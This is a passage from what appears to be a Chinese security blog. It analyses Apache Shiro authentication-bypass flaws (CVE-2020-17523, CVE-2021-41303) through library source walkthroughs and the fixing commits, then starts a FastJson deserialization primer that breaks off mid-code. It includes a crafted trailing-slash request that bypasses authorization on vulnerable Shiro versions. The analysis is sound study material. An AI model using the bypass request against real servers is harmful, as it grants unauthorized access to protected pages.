<strong>false</strong>，因此空格还在，返回了 <strong>["admin", "
"]</strong>，得以匹配到 <strong>/admin/</strong>*。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StringUtils (org.springframework.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String[] tokenizeToStringArray(</span><br><span class="line">        <span class="meta">@Nullable</span> String str, String delimiters, <span class="type">boolean</span> trimTokens, <span class="type">boolean</span> ignoreEmptyTokens) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> EMPTY_STRING_ARRAY;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">StringTokenizer</span> <span class="variable">st</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(str, delimiters);</span><br><span class="line">    List&lt;String&gt; tokens = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (st.hasMoreTokens()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> st.nextToken();</span><br><span class="line">        <span class="keyword">if</span> (trimTokens) &#123;</span><br><span class="line">            token = token.trim();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ignoreEmptyTokens || token.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            tokens.add(token);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> toStringArray(tokens);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞修复-4">漏洞修复</h2>
<p>在 <a
href="https://github.com/apache/shiro/commit/0842c27fa72d0da5de0c5723a66d402fe20903df"><strong>Commit</strong></a>
中将 <strong>tokenizeToStringArray</strong> 的
<strong>trimTokens</strong> 参数置为 <strong>false</strong>，这样同
<strong>SpringBoot</strong> 一致，默认不会调用 <strong>trim()</strong>
函数处理，因此也不会造成经过处理后的鉴权失败。</p>
<p><img
src="/images/Study-Unauthorized-Shiro/github.com_apache_shiro_commit_0842c27fa72d0da5de0c5723a66d402fe20903df.png" /></p>
<h1 id="cve-2021-41303">CVE-2021-41303</h1>
<h2 id="漏洞简介-5">漏洞简介</h2>
<p>影响版本：<strong>shiro &lt; 1.8.0</strong></p>
<p>漏洞描述：<strong>1.8.0</strong> 之前的 <strong>Apache
Shiro</strong>，在 <strong>Spring Boot</strong> 中使用 <strong>Apache
Shiro</strong> 时，特制的 <strong>HTTP</strong>
请求可能会导致身份验证绕过。用户应该更新到 <strong>Apache Shiro
1.8.0</strong>。</p>
<p>测试环境：<strong>Shiro 1.7.1</strong>，<strong>SpringBoot
2.5.3</strong></p>
<h2 id="漏洞分析-5">漏洞分析</h2>
<h3 id="绕过-3">/ 绕过</h3>
<p>配置如下。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">9090</span></span><br></pre></td></tr></table></figure>
<p>权限配置，这个需要这样的特殊配置，因此有些鸡肋。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">ShiroFilterFactoryBean <span class="title function_">shiroFilterFactoryBean</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">    bean.setSecurityManager(securityManager());</span><br><span class="line">    bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    bean.setSuccessUrl(<span class="string">&quot;/index&quot;</span>);</span><br><span class="line">    bean.setUnauthorizedUrl(<span class="string">&quot;/unauthorizedurl&quot;</span>);</span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;/admin/page&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>HTTP</strong> 请求如下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET http://127.0.0.1:9090/admin/page/</span><br></pre></td></tr></table></figure>
<h4 id="shiro处理部分">Shiro处理部分</h4>
<h5 id="调用栈-9">调用栈</h5>
<p>和之前的 <strong>CVE</strong> 类似，一路往下一直到
<strong>getPathWithinApplication</strong> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getPathWithinApplication:114, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">getPathWithinApplication:166, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getChain:103, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getExecutionChain:416, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">executeChain:449, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
<h5 id="getchain-4">getChain</h5>
<p><strong>getPathWithinApplication</strong> 返回
<strong>/admin/page/</strong>，<strong>removeTrailingSlash</strong> 删除
<strong>/</strong> 得到
<strong>/admin/page</strong>，由于拦截器的顺序，URL会经过
<strong>pathMatches</strong> 先匹配 <strong>/admin/*</strong>
拦截规则。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span></span><br><span class="line"><span class="keyword">public</span> FilterChain <span class="title function_">getChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain originalChain)</span> &#123;</span><br><span class="line">    <span class="type">FilterChainManager</span> <span class="variable">filterChainManager</span> <span class="operator">=</span> getFilterChainManager();</span><br><span class="line">    <span class="keyword">if</span> (!filterChainManager.hasChains()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> getPathWithinApplication(request); <span class="comment">// requestURI: &quot;/admin/test/page/&quot;</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">requestURINoTrailingSlash</span> <span class="operator">=</span> removeTrailingSlash(requestURI); <span class="comment">// requestURI: &quot;/admin/test/page/&quot;, requestURINoTrailingSlash: &quot;/admin/test/page&quot; </span></span><br><span class="line">    <span class="keyword">for</span> (String pathPattern : filterChainManager.getChainNames()) &#123;</span><br><span class="line">        <span class="comment">// for 循环匹配调用 pathMatches</span></span><br><span class="line">        <span class="keyword">if</span> (pathMatches(pathPattern, requestURI)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Matched path pattern [&#123;&#125;] for requestURI [&#123;&#125;].  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Utilizing corresponding filter chain...&quot;</span>, pathPattern, Encode.forHtml(requestURI));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> filterChainManager.proxy(originalChain, pathPattern);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pathPattern = removeTrailingSlash(pathPattern); <span class="comment">// pathPattern: &quot;/admin/*/page&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (pathMatches(pathPattern, requestURINoTrailingSlash)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                    log.trace(<span class="string">&quot;Matched path pattern [&#123;&#125;] for requestURI [&#123;&#125;].  &quot;</span> +</span><br><span class="line">                              <span class="string">&quot;Utilizing corresponding filter chain...&quot;</span>, pathPattern, Encode.forHtml(requestURINoTrailingSlash));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> filterChainManager.proxy(originalChain, requestURINoTrailingSlash);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="pathmatches">pathMatches</h5>
<p><strong>pathMatches</strong> 一路调到 <strong>doMatch</strong>，在
<strong>doMatch</strong> 中调用
<strong>tokenizeToStringArray</strong>，根据上一个
<strong>CVE-2020-17523</strong> 的修复已经把 <strong>trimToken</strong>
默认设置为 <strong>false</strong>，通过
<strong>tokenizeToStringArray</strong> 方法将路径以 <strong>/</strong>
拆分成数组，最后返回 <strong>false</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AntPathMatcher (org.apache.shiro.util)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">doMatch</span><span class="params">(String pattern, String path, <span class="type">boolean</span> fullMatch)</span> &#123; <span class="comment">// pattern: &quot;/admin/*&quot;, path: &quot;/admin/page/&quot;, fullMatch: true</span></span><br><span class="line">    <span class="keyword">if</span> (path == <span class="literal">null</span> || path.startsWith(<span class="built_in">this</span>.pathSeparator) != pattern.startsWith(<span class="built_in">this</span>.pathSeparator)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String[] pattDirs = StringUtils.tokenizeToStringArray(pattern, <span class="built_in">this</span>.pathSeparator, <span class="literal">false</span>, <span class="literal">true</span>); <span class="comment">// pattern: &quot;/admin/*&quot;, pattDirs: [&quot;admin&quot;, &quot;*&quot;]</span></span><br><span class="line">    String[] pathDirs = StringUtils.tokenizeToStringArray(path, <span class="built_in">this</span>.pathSeparator, <span class="literal">false</span>, <span class="literal">true</span>); <span class="comment">// path: &quot;/admin/page/&quot;, pathDir: [&quot;admin&quot;, &quot;page&quot;], pathSeparator: &quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">pattIdxStart</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pattIdxEnd</span> <span class="operator">=</span> pattDirs.length - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pathIdxStart</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pathIdxEnd</span> <span class="operator">=</span> pathDirs.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (pattIdxStart &lt;= pattIdxEnd &amp;&amp; pathIdxStart &lt;= pathIdxEnd) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">patDir</span> <span class="operator">=</span> pattDirs[pattIdxStart];</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;**&quot;</span>.equals(patDir)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!matchStrings(patDir, pathDirs[pathIdxStart])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pattIdxStart++;</span><br><span class="line">        pathIdxStart++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pathIdxStart &gt; pathIdxEnd) &#123;</span><br><span class="line">        <span class="comment">// Path is exhausted, only match if rest of pattern is * or **&#x27;s</span></span><br><span class="line">        <span class="keyword">if</span> (pattIdxStart &gt; pattIdxEnd) &#123;</span><br><span class="line">            <span class="comment">// pattern 以 * 结尾，因此返回 !path.endsWith(&quot;/&quot;) 的结果，为 false</span></span><br><span class="line">            <span class="keyword">return</span> (pattern.endsWith(<span class="built_in">this</span>.pathSeparator) ?</span><br><span class="line">                    path.endsWith(<span class="built_in">this</span>.pathSeparator) : !path.endsWith(<span class="built_in">this</span>.pathSeparator));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getchain-5">getChain</h5>
<p><strong>pathMatches</strong> 返回 <strong>false</strong> 得以进入
<strong>else</strong> 分支，然后 <strong>removeTrailingSlash</strong>
移除末尾的 <strong>/</strong> 得到
<strong>/admin/page</strong>，继续进入
<strong>pathMatches</strong>，这次返回 <strong>true</strong>，因此返回
<strong>filterChainManager.proxy</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span></span><br><span class="line"><span class="keyword">public</span> FilterChain <span class="title function_">getChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain originalChain)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (String pathPattern : filterChainManager.getChainNames()) &#123;</span><br><span class="line">        <span class="comment">// for 循环匹配调用 pathMatches</span></span><br><span class="line">        <span class="keyword">if</span> (pathMatches(pathPattern, requestURI)) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pathPattern = removeTrailingSlash(pathPattern); <span class="comment">// pathPattern: &quot;/admin/*/page&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (pathMatches(pathPattern, requestURINoTrailingSlash)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                    log.trace(<span class="string">&quot;Matched path pattern [&#123;&#125;] for requestURI [&#123;&#125;].  &quot;</span> +</span><br><span class="line">                              <span class="string">&quot;Utilizing corresponding filter chain...&quot;</span>, pathPattern, Encode.forHtml(requestURINoTrailingSlash));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> filterChainManager.proxy(originalChain, requestURINoTrailingSlash);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="proxy-1">proxy</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DefaultFilterChainManager (org.apache.shiro.web.filter.mgt)</span></span><br><span class="line"><span class="keyword">public</span> FilterChain <span class="title function_">proxy</span><span class="params">(FilterChain original, String chainName)</span> &#123;</span><br><span class="line">    <span class="type">NamedFilterList</span> <span class="variable">configured</span> <span class="operator">=</span> getChain(chainName);</span><br><span class="line">    <span class="keyword">if</span> (configured == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;There is no configured chain under the name/key [&quot;</span> + chainName + <span class="string">&quot;].&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> configured.proxy(original);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处 <strong>chainName</strong> 传入为 <strong>/admin/page</strong>
调用 <strong>getChain</strong> 方法获取过滤链，返回的是
<strong>ShiroConfig</strong> 中配置的 <strong>map.put("/admin/page",
"anon")</strong>，因此得以绕过。</p>
<p><img
src="/images/Study-Unauthorized-Shiro/image-20230615001055265.png" /></p>
<h2 id="漏洞修复-5">漏洞修复</h2>
<p><a
href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e"><strong>Commit</strong></a>
如下，直接将 <strong>filterChainManager.proxy</strong> 的第二个参数改为
<strong>pathPattern</strong>，直接传配置中的 <strong>URI</strong>
了，修复了此处的 <strong>/</strong> 的绕过问题。</p>
<p><img
src="/images/Study-Unauthorized-Shiro/github.com_apache_shiro_commit_4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e.png" /></p>
<h1 id="cve-2022-32532">CVE-2022-32532</h1>
<h1 id="refer">Refer</h1>
<p><a href="https://shiro.apache.org/security-reports"><strong>Apache
Shiro Vulnerability Reports</strong></a></p>
<p><a href="https://xz.aliyun.com/t/11633"><strong>Shiro</strong>
历史漏洞分析</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Unauthorized</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson 反序列化初探</title>
    <url>/Study-Unserialize-FastJson/</url>
    <content><![CDATA[<p>荒废了好久，<strong>remake</strong> 了。</p>
<span id="more"></span>
<h1 id="前置">前置</h1>
<p><strong>FastJson</strong> 在创建一个类实例时会通过反射调用类中特殊的
<strong>Getter/Setter</strong> 方法。</p>
<h2 id="getter-方法">Getter 方法</h2>
<ul>
<li><p>方法名长度大于 <strong>4</strong>。</p></li>
<li><p>不是静态方法。</p></li>
<li><p>其方法名以 <strong>get</strong> 开头，第 <strong>4</strong>
位是大写，类似驼峰命名。</p></li>
<li><p>方法不能有参数传递。</p></li>
<li><p>属性继承自
<strong>Collection/Map/AtomicBoolean/AtomicInteger/AtomicLong</strong>。</p></li>
<li><p>没有与之对应的 <strong>set</strong> 方法。</p></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// com.alibaba.fastjson.util.JavaBeanInfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JavaBeanInfo <span class="title function_">build</span><span class="params">(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (Method method : clazz.getMethods()) &#123; <span class="comment">// getter methods</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        <span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">                || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">                || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">                || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">                || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                String propertyName;</span><br><span class="line"></span><br><span class="line">                <span class="type">JSONField</span> <span class="variable">annotation</span> <span class="operator">=</span> method.getAnnotation(JSONField.class);</span><br><span class="line">                <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.deserialize()) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    propertyName = annotation.name();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> getField(fieldList, propertyName);</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">                    propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanInfo</span>(clazz, builderClass, defaultConstructor, <span class="literal">null</span>, <span class="literal">null</span>, buildMethod, jsonType, fieldList);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="setter-方法">Setter 方法</h2>
<ul>
<li>方法名长度大于 <strong>4</strong>。</li>
<li>不是静态方法。</li>
<li>返回类型为 <strong>Void</strong> 或者当前类。</li>
<li>方法只有一个参数传递。</li>
<li>其方法名以 <strong>set</strong> 开头，第 <strong>4</strong>
位是大写，类似驼峰命名。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// com.alibaba.fastjson.util.JavaBeanInfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JavaBeanInfo <span class="title function_">build</span><span class="params">(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">for</span> (Method method : methods) &#123; <span class="comment">//</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> <span class="number">0</span>, serialzeFeatures = <span class="number">0</span>, parserFeatures = <span class="number">0</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        <span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// support builder set</span></span><br><span class="line">        <span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONField</span> <span class="variable">annotation</span> <span class="operator">=</span> method.getAnnotation(JSONField.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (annotation == <span class="literal">null</span>) &#123;</span><br><span class="line">            annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (annotation != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!annotation.deserialize()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ordinal = annotation.ordinal();</span><br><span class="line">            serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());</span><br><span class="line">            parserFeatures = Feature.of(annotation.parseFeatures());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (annotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">propertyName</span> <span class="operator">=</span> annotation.name();</span><br><span class="line">                add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, ordinal, serialzeFeatures, parserFeatures, </span><br><span class="line">                                             annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> methodName.charAt(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        String propertyName;</span><br><span class="line">        <span class="keyword">if</span> (Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">            || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">                propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">            propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">            propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">            propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="序列化">序列化</h2>
<p>在反序列化中，主要使用 <strong>JSON.parse()</strong> 和
<strong>JSON.parseObject()</strong> 方法。</p>
<p>这几个方法在反序列化的时候，会调用反序列化目标类中的
<strong>construct/get/set/is</strong>
方法。如果这些方法中有危险操作，则能完成攻击。</p>
<h3 id="json.parseobjectstr-object.class">JSON.parseObject(str,
Object.class)</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> AtomicInteger age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;no parameter construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;south\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(jsonString, Object.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> AtomicInteger <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span 